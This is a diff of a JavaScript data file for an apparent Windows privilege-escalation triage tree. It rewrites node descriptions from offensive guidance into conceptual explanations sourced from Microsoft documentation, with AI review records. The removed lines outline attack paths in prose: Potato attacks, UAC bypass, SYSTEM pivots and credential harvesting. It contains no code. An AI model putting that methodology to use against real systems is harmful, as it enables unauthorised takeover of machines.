@@ -2,7 +2,7 @@ import { mitre, r } from '../lib.js';
 import { range } from '../windows-versions.js';
 
 /**
- * Windows local privilege-escalation techniques (web-verified).
+ * Windows local privilege-escalation topics. See individual review records for source-comparison scope.
  *
  * Shaped as the operator's triage tree (see windows-pe.ts). The single foothold/triage
  * node forks by CONTEXT into three lanes:
@@ -22,30 +22,1277 @@ import { range } from '../windows-versions.js';
 /** @type {import('../schema.js').TechniqueNodeDef[]} */
 export const peTechniqueNodes = [
   // ── Lane folders ────────────────────────────────────────────────────────────
-  { id: 'pe-cat-priv', label: 'Privileged Users', phase: 'hold', summary: 'A privileged token or group you already hold.', description: 'The account already holds something dangerous: an abusable token privilege or membership in a powerful local group. No hunting required: abuse the right you have.', references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, { label: 'HackTricks, Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }, ], },
-  { id: 'pe-cat-admin', label: 'Admin Users', phase: 'admin', summary: 'Already a local admin, at medium (UAC-filtered) or high integrity.', description: 'The account is in the local Administrators group. If UAC filters it to a medium-integrity token, bypass UAC to obtain the high-integrity token; once high-integrity, any administrator-to-SYSTEM technique applies.', references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
-  { id: 'pe-cat-enum', label: 'Unprivileged Users', phase: 'finding', summary: 'No inherent privilege; enumerate for a weakness.', description: 'The account holds no useful privilege, group, or admin membership. Enumerate the host (winPEAS / PrivescCheck) and work the findings: stored credentials, service and DLL/PATH misconfigurations, tasks and autoruns, privileged app/service abuse, and known-CVE exploits.', references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, { label: 'carlospolop, winPEAS', url: 'https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS' }, ], },
-  { id: 'pe-svc-account', label: 'Service Account', phase: 'svcacct', summary: 'Running as LOCAL/NETWORK SERVICE or an application-pool identity.', description: 'Code execution as a Windows service account: LOCAL SERVICE, NETWORK SERVICE, an IIS application-pool identity, or a service such as MSSQL. whoami names the account; whoami /priv lists its privileges. Service accounts very commonly hold SeImpersonatePrivilege, which leads straight to a Potato attack for SYSTEM. Where that privilege is not present, the default privilege set can usually be recovered first, then the same Potato path applies.', references: [ { label: 'HackTricks, Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }, ], },
+  {
+    "id": "pe-cat-priv",
+    "label": "Privileged Users",
+    "phase": "hold",
+    "summary": "Understand the privileges and group information in a Windows access token.",
+    "description": "A Windows access token records account identity, group information, and privileges. Privileges authorize system operations; object access rights concern permissions on individual resources. A privilege can be present in a token without being enabled. These distinctions matter when describing an account: a group name and a privilege name represent different parts of the security context.",
+    "references": [
+      {
+        "label": "Microsoft, Access tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "section": "Access token contents",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Privileges",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
+        "section": "Privilege/access-right distinction; access-token checks",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Windows Local Privilege Escalation",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      },
+      {
+        "label": "HackTricks, Abusing Tokens",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "description": "A Windows access token records account identity, group information, and privileges. Privileges authorize system operations; object access rights concern permissions on individual resources. A privilege can be present in a token without being enabled. These distinctions matter when describing an account: a group name and a privilege name represent different parts of the security context.",
+        "id": "pe-cat-priv",
+        "label": "Privileged Users",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Access tokens",
+            "section": "Access token contents",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Privileges",
+            "section": "Privilege/access-right distinction; access-token checks",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          },
+          {
+            "label": "HackTricks, Windows Local Privilege Escalation",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+          },
+          {
+            "label": "HackTricks, Abusing Tokens",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+          }
+        ],
+        "summary": "Understand the privileges and group information in a Windows access token."
+      },
+      "claims": [
+        {
+          "text": "An access token records account identity, group information, and privileges.",
+          "section": "Microsoft, Access tokens — Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        },
+        {
+          "text": "Windows distinguishes privileges for system operations from access rights on securable objects.",
+          "section": "Microsoft, Privileges — Privilege/access-right distinction; access-token checks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          ]
+        },
+        {
+          "text": "Privilege checks consider whether a required privilege is held and enabled.",
+          "section": "Microsoft, Privileges — Privilege/access-right distinction; access-token checks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-admin",
+    "label": "Admin Users",
+    "phase": "admin",
+    "summary": "Distinguish administrator membership from the token used by an application.",
+    "description": "An Administrators-group member can run ordinary applications with a standard user token. In the UAC Admin Approval Mode model, Windows provides separate standard and administrator tokens. Elevation uses an administrator token, and the consent or credential prompt is governed by policy. Group membership therefore does not describe the access token used by every application.",
+    "references": [
+      {
+        "label": "Microsoft, How User Account Control works",
+        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
+        "section": "Sign in process; The UAC user experience",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Windows Local Privilege Escalation",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "description": "An Administrators-group member can run ordinary applications with a standard user token. In the UAC Admin Approval Mode model, Windows provides separate standard and administrator tokens. Elevation uses an administrator token, and the consent or credential prompt is governed by policy. Group membership therefore does not describe the access token used by every application.",
+        "id": "pe-cat-admin",
+        "label": "Admin Users",
+        "phase": "admin",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, How User Account Control works",
+            "section": "Sign in process; The UAC user experience",
+            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          },
+          {
+            "label": "HackTricks, Windows Local Privilege Escalation",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+          }
+        ],
+        "summary": "Distinguish administrator membership from the token used by an application."
+      },
+      "claims": [
+        {
+          "text": "Under the UAC Admin Approval Mode model, an administrator can run applications with a standard user token; Windows provides separate standard and administrator tokens.",
+          "section": "Microsoft, How User Account Control works — Sign in process; The UAC user experience",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          ]
+        },
+        {
+          "text": "UAC uses consent or credential prompts for elevation, with prompt behavior controlled by policy.",
+          "section": "Microsoft, How User Account Control works — The UAC user experience; The credential prompt",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-enum",
+    "label": "Unprivileged Users",
+    "phase": "finding",
+    "summary": "Understand standard-user access through identity and resource permissions.",
+    "description": "Standard-user access still has a security context: the token identifies the account, its groups, and its privileges. Resources can grant permissions to particular users or groups through access-control entries. The label unprivileged should not be read as meaning that an account has no permissions; access is evaluated for the requested resource and operation.",
+    "references": [
+      {
+        "label": "Microsoft, Access tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "section": "Access token contents",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, DACLs and ACEs",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces",
+        "section": "Opening explanation and group-access example",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Windows Local Privilege Escalation",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      },
+      {
+        "label": "carlospolop, winPEAS",
+        "url": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "description": "Standard-user access still has a security context: the token identifies the account, its groups, and its privileges. Resources can grant permissions to particular users or groups through access-control entries. The label unprivileged should not be read as meaning that an account has no permissions; access is evaluated for the requested resource and operation.",
+        "id": "pe-cat-enum",
+        "label": "Unprivileged Users",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Access tokens",
+            "section": "Access token contents",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, DACLs and ACEs",
+            "section": "Opening explanation and group-access example",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces"
+          },
+          {
+            "label": "HackTricks, Windows Local Privilege Escalation",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+          },
+          {
+            "label": "carlospolop, winPEAS",
+            "url": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
+          }
+        ],
+        "summary": "Understand standard-user access through identity and resource permissions."
+      },
+      "claims": [
+        {
+          "text": "An access token carries the account identity, group information, and privileges used in security checks.",
+          "section": "Microsoft, Access tokens — Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        },
+        {
+          "text": "Discretionary access-control entries can grant resource permissions to particular users or groups.",
+          "section": "Microsoft, DACLs and ACEs — Opening explanation and group-access example",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-svc-account",
+    "label": "Service Account",
+    "phase": "svcacct",
+    "summary": "Distinguish built-in service accounts and IIS application-pool identities.",
+    "description": "Windows services and application pools can use different account identities. LocalService has limited local privileges and presents anonymous network credentials. NetworkService also has limited local privileges, but presents the computer's credentials to remote servers. IIS application-pool identities use virtual accounts that distinguish individual pools and can be assigned resource permissions. These identities should not be treated as one uniform account.",
+    "references": [
+      {
+        "label": "Microsoft, LocalService Account",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account",
+        "section": "Opening account definition",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, NetworkService Account",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account",
+        "section": "Opening account definition and network credentials",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Application Pool Identities",
+        "url": "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities",
+        "section": "Application Pool Identity Accounts; Securing Resources",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Abusing Tokens",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "description": "Windows services and application pools can use different account identities. LocalService has limited local privileges and presents anonymous network credentials. NetworkService also has limited local privileges, but presents the computer's credentials to remote servers. IIS application-pool identities use virtual accounts that distinguish individual pools and can be assigned resource permissions. These identities should not be treated as one uniform account.",
+        "id": "pe-svc-account",
+        "label": "Service Account",
+        "phase": "svcacct",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, LocalService Account",
+            "section": "Opening account definition",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, NetworkService Account",
+            "section": "Opening account definition and network credentials",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Application Pool Identities",
+            "section": "Application Pool Identity Accounts; Securing Resources",
+            "url": "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"
+          },
+          {
+            "label": "HackTricks, Abusing Tokens",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+          }
+        ],
+        "summary": "Distinguish built-in service accounts and IIS application-pool identities."
+      },
+      "claims": [
+        {
+          "text": "LocalService has limited local privileges and presents anonymous credentials on the network.",
+          "section": "Microsoft, LocalService Account — Opening account definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account"
+          ]
+        },
+        {
+          "text": "NetworkService has limited local privileges and presents the computer's credentials to remote servers.",
+          "section": "Microsoft, NetworkService Account — Opening account definition and network credentials",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account"
+          ]
+        },
+        {
+          "text": "IIS can use a unique virtual account for an application pool and secure resources using the pool identity.",
+          "section": "Microsoft, Application Pool Identities — Application Pool Identity Accounts; Securing Resources",
+          "sources": [
+            "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"
+          ]
+        }
+      ]
+    }
+  },
 
   // ── Sub-folders: Privileged Users ───────────────────────────────────────────
-  { id: 'pe-cat-tokens', label: 'Token Privileges', phase: 'hold', kind: 'category', summary: 'whoami /priv, abusable token privileges.', description: 'Dangerous privileges surfaced by whoami /priv: SeImpersonate / SeAssignPrimaryToken, SeBackup / SeRestore, SeDebug, SeTakeOwnership, SeLoadDriver, SeManageVolume, SeTrustedCredManAccess, SeCreateToken, SeTcb, and SeRelabel.', mitre: mitre('T1134'), references: [ { label: 'HackTricks, Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }, ], },
-  { id: 'pe-cat-groups', label: 'Local Group Membership', phase: 'hold', kind: 'category', summary: 'whoami /groups, privileged group membership.', description: 'Membership in a local or built-in group whose rights convert to SYSTEM or credential theft: Backup / Server / Print Operators, DnsAdmins, Hyper-V Administrators, Event Log Readers, Account Operators, or a UAC-filtered Administrators token.', references: [ { label: 'HackTricks, Privileged Groups & Token Privileges', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html' }, ], },
+  {
+    "id": "pe-cat-tokens",
+    "label": "Token Privileges",
+    "phase": "hold",
+    "kind": "category",
+    "summary": "System privileges carried by a Windows access token.",
+    "description": "An access token describes a process or thread's security context. It includes account and group identifiers and assigned privileges. Privileges authorize system operations and differ from object access rights. Windows checks both possession and enabled state when an operation requires a privilege; assignments can differ between computers.",
+    "mitre": {
+      "id": "T1134",
+      "url": "https://attack.mitre.org/techniques/T1134/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Access tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "kind": "primary",
+        "section": "Introduction; Access token contents"
+      },
+      {
+        "label": "Microsoft, Privileges",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
+        "kind": "primary",
+        "section": "Introduction: privileges versus access rights; privilege assignment and checks"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "id": "pe-cat-tokens",
+        "label": "Token Privileges",
+        "phase": "hold",
+        "kind": "category",
+        "summary": "System privileges carried by a Windows access token.",
+        "description": "An access token describes a process or thread's security context. It includes account and group identifiers and assigned privileges. Privileges authorize system operations and differ from object access rights. Windows checks both possession and enabled state when an operation requires a privilege; assignments can differ between computers.",
+        "mitre": {
+          "id": "T1134",
+          "url": "https://attack.mitre.org/techniques/T1134/"
+        },
+        "references": [
+          {
+            "label": "Microsoft, Access tokens",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+            "kind": "primary",
+            "section": "Introduction; Access token contents"
+          },
+          {
+            "label": "Microsoft, Privileges",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
+            "kind": "primary",
+            "section": "Introduction: privileges versus access rights; privilege assignment and checks"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Access tokens carry identity, group membership, and privilege information for a process or thread.",
+          "section": "Microsoft, Access tokens — Introduction; Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        },
+        {
+          "text": "System privileges and object access rights are distinct authorization concepts.",
+          "section": "Microsoft, Privileges — Introduction: privileges versus access rights; privilege assignment and checks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          ]
+        },
+        {
+          "text": "Privilege checks consider whether a privilege is held and enabled; assignments are local to each computer.",
+          "section": "Microsoft, Privileges — Introduction: privileges versus access rights; privilege assignment and checks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-groups",
+    "label": "Local Group Membership",
+    "phase": "hold",
+    "kind": "category",
+    "summary": "How group identities participate in Windows access checks.",
+    "description": "Windows uses group security identifiers in an access token when evaluating an object's discretionary access control list (DACL). Group identifiers can be enabled, disabled, or deny-only. A group name alone does not describe the access a process receives: the token attributes, requested rights, and object permissions matter.",
+    "references": [
+      {
+        "label": "Microsoft, How AccessCheck Works",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object",
+        "kind": "primary",
+        "section": "DACLs"
+      },
+      {
+        "label": "Microsoft, SID Attributes in an Access Token",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
+        "kind": "primary",
+        "section": "Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "id": "pe-cat-groups",
+        "label": "Local Group Membership",
+        "phase": "hold",
+        "kind": "category",
+        "summary": "How group identities participate in Windows access checks.",
+        "description": "Windows uses group security identifiers in an access token when evaluating an object's discretionary access control list (DACL). Group identifiers can be enabled, disabled, or deny-only. A group name alone does not describe the access a process receives: the token attributes, requested rights, and object permissions matter.",
+        "references": [
+          {
+            "label": "Microsoft, How AccessCheck Works",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object",
+            "kind": "primary",
+            "section": "DACLs"
+          },
+          {
+            "label": "Microsoft, SID Attributes in an Access Token",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
+            "kind": "primary",
+            "section": "Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "DACL evaluation compares access-control entries with identities in the requesting security context.",
+          "section": "Microsoft, How AccessCheck Works — DACLs",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object"
+          ]
+        },
+        {
+          "text": "Enabled, disabled, and deny-only group identifiers have different roles in access checks.",
+          "section": "Microsoft, SID Attributes in an Access Token — Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
+          ]
+        }
+      ]
+    }
+  },
 
   // ── Sub-folders: Admin Users ────────────────────────────────────────────────
-  { id: 'pe-cat-uac', label: 'UAC Bypass', phase: 'admin', kind: 'category', summary: 'Raise a UAC-filtered (medium-integrity) admin token to high integrity, no consent prompt.', description: 'With UAC enabled, an administrator runs under a split token: a filtered medium-integrity token for everyday use, and the full high-integrity token only after a consent prompt. A bypass abuses an auto-elevating, Microsoft-signed binary or scheduled task to obtain the high-integrity token silently. It raises integrity, not privilege, so it applies only to an account that is already a local administrator; a standard user gains nothing. UACMe catalogues ~70 methods; the common ones are covered here.', mitre: mitre('T1548.002'), references: [ { label: 'PentestLab, UAC Bypass Fodhelper', url: 'https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/' }, ], },
-  { id: 'pe-cat-admin2sys', label: 'Elevate to SYSTEM', phase: 'admin', kind: 'category', summary: 'Pivot from a high-integrity administrator token to NT AUTHORITY\\SYSTEM.', description: 'With a high-integrity administrator token, obtain a SYSTEM context: install or reconfigure a service to run as LocalSystem, register a scheduled task that runs as SYSTEM, or duplicate the token of an existing SYSTEM process.', mitre: mitre('T1134.001'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
+  {
+    "id": "pe-cat-uac",
+    "label": "UAC Bypass",
+    "phase": "admin",
+    "kind": "category",
+    "summary": "Understand filtered administrator tokens and UAC elevation.",
+    "description": "Under UAC Admin Approval Mode, an administrator has a standard user token and an administrator token. The standard token filters administrative privileges and security identifiers for everyday applications. Using the full administrator token follows the configured elevation policy. Standard users can perform an administrative task by supplying valid administrator credentials when the policy permits it.",
+    "mitre": {
+      "id": "T1548.002",
+      "url": "https://attack.mitre.org/techniques/T1548/002/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, How User Account Control works",
+        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
+        "section": "Sign in process; The UAC user experience",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Under UAC Admin Approval Mode, an administrator has a standard user token and an administrator token. The standard token filters administrative privileges and security identifiers for everyday applications. Using the full administrator token follows the configured elevation policy. Standard users can perform an administrative task by supplying valid administrator credentials when the policy permits it.",
+        "id": "pe-cat-uac",
+        "kind": "category",
+        "label": "UAC Bypass",
+        "mitre": {
+          "id": "T1548.002",
+          "url": "https://attack.mitre.org/techniques/T1548/002/"
+        },
+        "phase": "admin",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, How User Account Control works",
+            "section": "Sign in process; The UAC user experience",
+            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          }
+        ],
+        "summary": "Understand filtered administrator tokens and UAC elevation."
+      },
+      "claims": [
+        {
+          "text": "The administrator sign-in model uses separate standard and administrator tokens; the standard token filters administrative privileges and security identifiers.",
+          "section": "Microsoft, How User Account Control works — Sign in process",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          ]
+        },
+        {
+          "text": "UAC distinguishes administrator consent from a standard user supplying administrator credentials, with prompt behavior controlled by policy.",
+          "section": "Microsoft, How User Account Control works — The UAC user experience; The credential prompt; The consent prompt",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "pe-cat-admin2sys",
+    "label": "Elevate to SYSTEM",
+    "phase": "admin",
+    "kind": "category",
+    "summary": "Distinguish LocalSystem from an interactive administrator account.",
+    "description": "LocalSystem is a predefined account used by the service control manager and has extensive privileges on the local computer. It is not associated with a logged-on user account. Windows access tokens identify the account, groups, and privileges associated with a process or thread; LocalSystem describes an account identity, rather than a new name for an interactive administrator.",
+    "mitre": {
+      "id": "T1134.001",
+      "url": "https://attack.mitre.org/techniques/T1134/001/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, LocalSystem Account",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
+        "section": "Introduction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Access Tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "section": "Introduction",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "LocalSystem is a predefined account used by the service control manager and has extensive privileges on the local computer. It is not associated with a logged-on user account. Windows access tokens identify the account, groups, and privileges associated with a process or thread; LocalSystem describes an account identity, rather than a new name for an interactive administrator.",
+        "id": "pe-cat-admin2sys",
+        "kind": "category",
+        "label": "Elevate to SYSTEM",
+        "mitre": {
+          "id": "T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/"
+        },
+        "phase": "admin",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, LocalSystem Account",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Access Tokens",
+            "section": "Introduction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          }
+        ],
+        "summary": "Distinguish LocalSystem from an interactive administrator account."
+      },
+      "claims": [
+        {
+          "text": "LocalSystem is a predefined service-control-manager account with extensive local privileges and is not associated with a logged-on user account.",
+          "section": "Microsoft, LocalSystem Account — Introduction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          ]
+        },
+        {
+          "text": "Access tokens contain account and group security identifiers and the account's privileges.",
+          "section": "Microsoft, Access Tokens — Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        }
+      ]
+    }
+  },
 
   // ── Sub-folders: Unprivileged Users ─────────────────────────────────────────
-  { id: 'pe-cat-creds', label: 'Stored Credentials', phase: 'finding', kind: 'category', summary: 'Reusable secrets on disk and in the registry.', description: 'Credentials you can replay as a more privileged user: registry-hive secrets, DPAPI, autologon and saved credentials, PowerShell history, files and configs, and password-manager / browser stores. winPEAS and LaZagne automate most of these. (Live LSASS/process memory is covered under the credential-dumping techniques, not this on-disk hub.)', mitre: mitre('T1552'), references: [ { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }, ], },
+  {
+    "id": "pe-cat-creds",
+    "label": "Stored Credentials",
+    "phase": "finding",
+    "kind": "category",
+    "summary": "Distinguish credential storage from data-protection mechanisms.",
+    "description": "Windows provides Credentials Management APIs for applications to obtain and manage information such as user names and passwords, including a user credentials store. DPAPI provides encryption and integrity protection for application data. These are different mechanisms: a storage location alone does not describe the protection applied to its contents.",
+    "mitre": {
+      "id": "T1552",
+      "url": "https://attack.mitre.org/techniques/T1552/"
+    },
+    "references": [
+      {
+        "label": "Microsoft, Credentials Management",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management",
+        "section": "Introduction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, CryptProtectData function",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata",
+        "section": "Introduction; Remarks",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
